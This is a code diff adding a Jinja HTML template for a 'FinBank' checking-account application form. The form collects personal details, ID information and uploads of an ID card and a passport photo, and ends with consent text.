@@ -1,0 +1,392 @@
+{% extends "main.html" %}
+{% block content %}
+
+
+<head>
+    <link rel="stylesheet" href="/static/css/sendmoney.css">
+    </head>
+    <h1 class="text-center text-17 pt-5 mt-5">Checking Account Application Form</h1>
+<div class="col-md-9 col-lg-10 col-xl-10 mx-auto my-5 p-5">
+    <div class="bg-white shadow-sm rounded p-5 pt-sm-4 pb-sm-5 px-sm-5 mb-4">
+	<div id="mainpage" data-role="page" class="osmp-app ui-page ui-page-theme-a ui-page-active" data-title="FinBank - Getting Started" data-url="mainpage" style=""> 
+                        </div>
+		<div id="mainColumns" tabindex="-1" role="main" class="ui-content osmp-content">
+			<div class="primary-content">
+				<div class="osmp-title">
+					<div>
+						<h1 class="text-15  py-5 mt-5">Welcome</h1>
+					</div>
+					<div class="c80">
+                        <h3 class="">
+                            <span class="c79">Important information about procedures for opening a new account</span>
+                        </h3>
+                        
+                
+                        <p>
+                            <p class="c79 mb-5 pb-5 text-5">To help the government fight the funding of terrorism and money laundering activities, U.S. Federal law requires financial institutions to obtain, verify, and record information that identifies each person (individual or business) who opens an account. What this means for you:  When you open an account, we will ask for your name, address, date of birth, and other information that will allow us to identify you.  We may also ask for your driver’s license or other identifying information.</p>
+                        </p>
+                </div>
+						<div class="large-screen text-5 right sub-title float-end d-none d-md-block">
+							All fields are required.
+						</div>
+				</div>
+				<div class="">
+										<div class="sub-title">
+											<h2>Finbank Everyday Checking</h2>
+											
+										</div>
+				</div>
+
+<div class="">
+	<div class="">
+ <ol style=" padding: 0 0 0 10px; margin: 0 0 20px 10px; display: block; list-style-type: disc; margin-block-start: 1em; margin-block-end: 1em; margin-inline-start: 0px; margin-inline-end: 0px; padding-inline-start: 40px;">
+    <li style="list-style-type: decimal;">Tell us about yourself</li>
+    <li style="list-style-type: decimal;">Customize your account</li>
+    <li style="list-style-type: decimal;">Make your opening deposit</li>
+</ol> 
+            </div></div>
+	
+<div class="">
+	<div class="">
+
+ <p>When you submit your application, you’ll receive an instant online response informing you of your application status and any next steps.</p> 
+            </div></div>
+<div class=" ">
+	<div class="">
+         
+ <div class="sub-title mt-5"><h2>What you'll need to apply</h2></div>
+<ul>
+    <li>Passport Photograph</li>
+    <li>Valid ID (driver's license, state ID, Matricula card)</li>
+</ul> 
+
+
+     </div></div>
+
+<form  action="" method="post">
+    {{ data.form.hidden_tag() }}
+	<h2 class="my-5 sub-title pb-2" style="border-bottom: 2px solid rgb(138, 15, 61)">
+		Personal information
+	</div>
+
+	<section class="">
+        <div class="">
+            <div class="d-md-flex" style="justify-content: space-between; gap: 20px;">
+                <div class="account-form-group bank" style="flex-basis: 50%;">
+                    {{ data.form.first_name }}
+                </div>
+                <div class="account-form-group bank" style="flex-basis: 50%;">
+                    {{ data.form.middle_name }}
+                </div>
+            </div>
+            <div class="account-form-group last">
+                    {{ data.form.last_name }}
+            </div>
+            <div class="d-md-flex" style="justify-content: space-between; gap: 20px;">
+                <div class="account-form-group" style="flex-basis: 50%;">
+                    <label for="account" class=" fw-600">ID type</label>
+                    <select name="account" id="account">
+                        <option value="20312321131">Drivers License/State ID</option>
+                        <option value="20312321131">Matricula Card</option>
+                        <option value="20312321131">Other</option>
+                    </select>
+                </div>
+                <div class="account-form-group bank" style="flex-basis: 50%;">
+                    <label for="id_number" class=" fw-600">ID Number</label>
+                    {{ data.form.id_number }}
+                </div>
+            </div>
+
+            <div class="d-md-flex" style="justify-content: space-between; gap: 20px;">
+                <div class="account-form-group" style="flex-basis: 50%;">
+                    <label for="account" class=" fw-600">Country Issued</label>
+                    <select name="account" id="account">
+                        <option value="20312321131">United States(US)</option>
+                        <option value="20312321131">United Kindgom(UK)</option>
+                        <option value="20312321131">Other</option>
+                    </select>
+                </div>
+                <div class="account-form-group bank" style="flex-basis: 50%;">
+                    <label for="expiry" class=" fw-600">Expiry Date</label>
+                    <input name="expiry" class="account-form-control" type="date" placeholder="Expiry date"/>
+                </div>
+            </div>
+
+            <div class="d-md-flex" style="justify-content: space-between; gap: 20px;">
+                <div class="account-form-group" style="flex-basis: 50%;">
+                    <label for="account" class=" fw-600">Citizenship</label>
+                    <select name="account" id="account">
+                        <option value="20312321131">US Citizen</option>
+                        <option value="20312321131">Resident Alien</option>
+                        <option value="20312321131">Non-Resident Alien</option>
+                    </select>
+                </div>
+                <div class="account-form-group bank" style="flex-basis: 50%;">
+                    <label for="dob" class=" fw-600">Date Of Birth</label>
+                    {{ data.form.dob }}
+                </div>
+            </div>
+            
+            <h2 class="my-5 sub-title pb-2" style="border-bottom: 2px solid rgb(138, 15, 61)">
+                Contact information
+            </div>
+            <div class="account-form-group last">
+                {{ data.form.email }}
+            </div>
+
+            <div class="d-md-flex" style="justify-content: space-between; gap: 20px;">
+                <div class="account-form-group" style="flex-basis: 20%;">
+                    <label for="account" class=" fw-600">Phone type</label>
+                    <select name="account" id="account">
+                        <option value="20312321131">Home</option>
+                        <option value="20312321131">Mobile</option>
+                        <option value="20312321131">Work</option>
+                    </select>
+                </div>
+                <div class="account-form-group bank" style="flex-basis: 50%;">
+                    <label for="phone_number" class=" fw-600">Phone Number</label>
+                    {{ data.form.phone_number }}
+                </div>
+            </div>
+
+            <div class="d-md-flex" style="justify-content: space-between; gap: 20px;">
+                <div class="account-form-group" style="flex-basis: 20%;">
+                    <label for="alt_phone_type" class=" fw-600">Alternate Phone type</label>
+                    <select name="alt_phone_type" id="account">
+                        <option value="20312321131">Home</option>
+                        <option value="20312321131">Mobile</option>
+                        <option value="20312321131">Work</option>
+                    </select>
+                </div>
+                <div class="account-form-group bank" style="flex-basis: 50%;">
+                    <label for="alt_phone_number" class=" fw-600">Alternate Phone Number</label>
+                    {{ data.form.alt_phone_number }}
+                </div>
+            </div>
+            <div class="d-md-flex" style="justify-content: space-between; gap: 20px;">
+                <div class="account-form-group" style="flex-basis: 50%;">
+                    <div class="account-form-group bank">
+                        {{ data.form.home_address }}
+                    </div>
+                </div>
+                <div class="account-form-group bank" style="flex-basis: 50%;">
+                    <div class="account-form-group bank">
+                        {{ data.form.alt_home_address }}
+                    </div>
+                </div>
+            </div>
+            <div class="d-md-flex" style="justify-content: space-between; gap: 20px;">
+                <div class="account-form-group"style="flex-basis: 50%;" >
+                    {{ data.form.city }}
+                </div>
+                <div class="account-form-group bank" style="flex-basis: 50%;">
+                    {{ data.form.state }}
+                </div>
+            </div>
+            <div class="d-md-flex" style="justify-content: space-between; gap: 20px;">
+                <div class="account-form-group" style="flex-basis: 50%;">
+                    <label for="occupation" class=" fw-600">Occupation</label>
+                    <select name="occupation" id="occupation">
+                        <option value="">
+                            Select one
+                          </option>
+                            <option value="EXECUTIVE">Executive, Professional, Semi Prof</option>
+                            <option value="MANAGER">Manager, Owner, Office</option>
+                            <option value="PROD_SALES">Prod, Sales, Trade, Service, Labor</option>
+                            <option value="MILITARY">Military</option>
+                            <option value="TEACHER">Teacher</option>
+                            <option value="DIPLOMAT">Diplomat/Government Official</option>
+                            <option value="RETIRED">Retired</option>
+                            <option value="HOMEMAKER">Homemaker</option>
+                            <option value="STUDENT">Student</option>
+                            <option value="UNEMPLOYED_WITH_INCOME">Unemployed w/income</option>
+                            <option value="UNEMPLOYED_WITHOUT_INCOME">Unemployed-no income</option>
+                    </select>
+                </div>
+                <div class="account-form-group bank" style="flex-basis: 50%;">
+                    <label for="zip_code" class=" fw-600">Zip code</label>
+                    {{ data.form.zip_code }}
+                </div>
+            </div>
+            
+            <!-- <div class="account-form-group last d-block">
+                <label for="occupation" class=" fw-600">Occupation</label>
+                <select name="occupation" id="occupation">
+                    <option value="">
+                        Select one
+                      </option>
+                        <option value="EXECUTIVE">Executive, Professional, Semi Prof</option>
+                        <option value="MANAGER">Manager, Owner, Office</option>
+                        <option value="PROD_SALES">Prod, Sales, Trade, Service, Labor</option>
+                        <option value="MILITARY">Military</option>
+                        <option value="TEACHER">Teacher</option>
+                        <option value="DIPLOMAT">Diplomat/Government Official</option>
+                        <option value="RETIRED">Retired</option>
+                        <option value="HOMEMAKER">Homemaker</option>
+                        <option value="STUDENT">Student</option>
+                        <option value="UNEMPLOYED_WITH_INCOME">Unemployed w/income</option>
+                        <option value="UNEMPLOYED_WITHOUT_INCOME">Unemployed-no income</option>
+                </select>
+            </div>  -->
+            <br>
+
+            <div class="d-md-flex mt-5" style="justify-content: space-between; gap: 20px;">
+                <div class="ugf-form-card" style="flex-basis: 50%; display: none;">
+                    <div class="card-header">
+                      <div class="icon">
+                        <img src="images/card/10.png" alt="">
+                      </div>
+                      <h3>Upload ID card</h3>
+                      <p>Attach (jpeg/jpg/png/) file below</p>
+                    </div>
+                  </div>
+    
+                  <div class="ugf-form-card" style="flex-basis: 50%;">
+                    <div class="card-header">
+                      <div class="icon">
+                        <img src="images/card/10.png" alt="">
+                      </div>
+                      <h3>Upload Passport Photograph</h3>
+                      <p>Attach (jpeg/jpg/png/) file below</p>
+                    </div>
+                    <div class="form">
+                      <div class="form-group">
+                        <input name="profile_image" type="file" class="form-control" id="fileup2" hidden="">
+                        <label class="custom-file" for="fileup2"><img src="images/card/cloud.png" alt=""><p>Drag file(s) here to upload, or <span class="">Click Here</span></p></label>
+                      </div>
+                      <!-- <button class="btn">Upload File</button> -->
+                    </div>
+                  </div>
+
+                  <div class="ugf-form-card" style="flex-basis: 50%;">
+                    <div class="card-header">
+                      <div class="icon">
+                        <img src="images/card/10.png" alt="">
+                      </div>
+                      <h3>Upload ID card</h3>
+                      <p>Attach (jpeg/jpg/png/pdf) file below</p>
+                    </div>
+                    <div class="form">
+                      <div class="form-group">
+                        <input name="id_image" type="file" class="form-control" id="fileup2" hidden="">
+                        <label class="custom-file" for="fileup2"><img src="images/card/cloud.png" alt=""><p>Drag file(s) here to upload, or <span class="">Click Here </span></p></label>
+                      </div>
+                      <!-- <button class="btn">Upload File</button> -->
+                    </div>
+                  </div>
+            </div>
+            
+			<div class="ui-field-contain inline-field-contain">
+				<fieldset aria-required="true">
+		<legend class="fw-600">Are you opening an individual or a joint account?</legend>
+	
+					<div>
+						By selecting Joint, you are confirming that your joint applicant has authorized you to apply for a joint account in both your names.
+					</div>
+					<div class="inline-field" style="float: left; margin: 0 15px 4px 0; white-space: nowrap; color: #44464a;">
+						<div class="ui-radio"><label for="accountOwnershipIndividual" class="ui-btn ui-corner-all ui-btn-inherit ui-btn-icon-left ui-radio-off" style="border-style: none;padding-right: 5px; color: #44464a;">
+							Individual
+						</label><input id="accountOwnershipIndividual" name="accountOwnership.accountOwnership" class="required" ng-model="accountOwnership.accountOwnership" type="radio" value="individual"></div>
+						
+					</div>
+					<div class="inline-field">
+						<div class="ui-radio"><label for="accountOwnershipJoint" class="ui-btn ui-corner-all ui-btn-inherit ui-btn-icon-left ui-radio-off" style="border-style: none;padding-right: 5px; color: #44464a;">
+							Joint
+						</label><input id="accountOwnershipJoint" name="accountOwnership.accountOwnership" class="required" ng-model="accountOwnership.accountOwnership" type="radio" value="joint"></div>
+						
+					</div>
+				</fieldset>
+			</div>
+
+			<div class="ui-field-contain inline-field-contain mt-4">
+				<fieldset aria-required="true">
+
+		<legend class="fw-600">
+			
+						Are you a FinBank Online Banking Customer?
+					
+		</legend>
+					<div>
+						Sign on for an even faster, prefilled application.
+					</div>
+					<div class="inline-field" style="float: left; margin: 0 15px 4px 0; white-space: nowrap; color: #44464a;">
+						<div class="ui-radio"><label for="onlineCustomerYes" class="ui-btn ui-corner-all ui-btn-inherit ui-btn-icon-left ui-radio-off" style="border-style: none;padding-right: 5px; color: #44464a;">
+							Yes
+						</label><input id="onlineCustomerYes" name="onlineBankingCustomer.onlineBankingCustomer" class="required" ng-model="onlineBankingCustomer.onlineBankingCustomer" type="radio" value="yes"></div>
+						
+					</div>
+					<div class="inline-field">
+						<div class="ui-radio"><label for="onlineCustomerNo" class="ui-btn ui-corner-all ui-btn-inherit ui-btn-icon-left ui-radio-off" style="border-style: none;padding-right: 5px; color: #44464a;">
+							No
+						</label><input id="onlineCustomerNo" name="onlineBankingCustomer.onlineBankingCustomer" class="required" ng-model="onlineBankingCustomer.onlineBankingCustomer" type="radio" value="no"></div>
+						
+					</div>
+				</fieldset>
+			</div>	
+	</section>
+    <section class="section">
+        <div class="margin-bot-20">
+            <div class="small-screen">
+    
+     <p><span class="c79"><strong>By selecting Continue</strong> , you agree that FinBank Bank, N.A. may:</span></p>
+    <ul style="    padding: 0 0 0 10px; margin: 0 0 20px 10px; display: block; list-style-type: disc; margin-block-start: 1em; margin-block-end: 1em; margin-inline-start: 0px; margin-inline-end: 0px; padding-inline-start: 40px;">
+        <li style="list-style-type: square;"><span class="c79">By continuing, I authorize Fintech to make inquiries to state, federal and consumer reporting agencies <strong>(this may include ordering a credit report, which should not affect my credit score)</strong>  to obtain information to determine if it should open my account.
+            I certify that all information I provided for this application is true and correct. Once I select Continue, I will not be able to return to edit my personal and contact information.</span></li>
+        <li style="list-style-type: square;"><span class="c79">Contact you at any phone number you provide during this online session <strong>to call or text you using autodialer/automatic telephone dialing technology and/or prerecorded/artificial voice messages.</strong> If the phone number you provide is registered to a cell phone, you agree that you own or are authorized to provide the phone number and you acknowledge your mobile carrier’s message and data rates may apply.&nbsp;Your agreement is not a condition of purchase.</span></li>
+        <li style="list-style-type: square;"><span class="c79">Contact you at any email address you provide during this online session. You can revoke your agreement to receive marketing emails at any time. Your mobile carrier’s</span> <span class="c79"><span class="c79">message and data rates</span> may apply.</span></li>
+        <li style="list-style-type: square;"><span class="c79">Use personal and financial information about you from our affiliated companies to prefill the application.</span></li>
+    </ul> 
+                </div></div>
+    
+        <div class="not-large-screen margin-bot-20">
+                </div>
+        
+        <div class="btn-ctr"><div class="btn-ctr-inner">
+            {{ data.form.submit }}
+        </div>
+    </div>
+</form>
+
+
+	
+</section>
+		<p>
+			FinBank, N.A. Member FDIC.
+		</p>
+</div>
+<div class="secondary-content">
+		<div class="products large-screen">
+			<h2>
+				You are applying for
+			</h2>
+							<div class="product-list">
+										<p>FinBank Everyday Checking</p>
+										
+							</div>
+		</div>
+		<div class="large-screen">      
+
+            </div>	
+			<div class="not-large-screen">
+         <div class="contact-bar" data-cid="tcm:343-49782-16" data-ctid="tcm:322-6222-32">
+</div>
+        
+    </div>
+</div>
+     </div><div class="large-screen">
+         <div class="contact-bar" data-cid="tcm:343-49782-16" data-ctid="tcm:91-6222-32">
+    <div class="contact-bar-title">
+        <h2>Still have questions?</h2>
+    </div>
+    <div class="collapsible-group">
+        
+        <div data-role="collapsible" data-iconpos="right" class="ui-collapsible ui-collapsible-inset ui-corner-all ui-collapsible-themed-content ui-collapsible-collapsed"><h3 class="ui-icon-callus ui-collapsible-heading ui-collapsible-heading-collapsed"><a href="/contact" class="ui-collapsible-heading-toggle ui-btn ui-icon-plus ui-btn-icon-right ui-btn-inherit" id="CallUs" aria-expanded="false">Call Us</a></h3><div class="ui-collapsible-content ui-body-inherit ui-collapsible-content-collapsed" aria-hidden="true" role="region" aria-labelledby="CallUs">
+        </div></div>
+        
+    </div>
+</div>
+</div>
+</div>
+</div>
+
+{% endblock %}
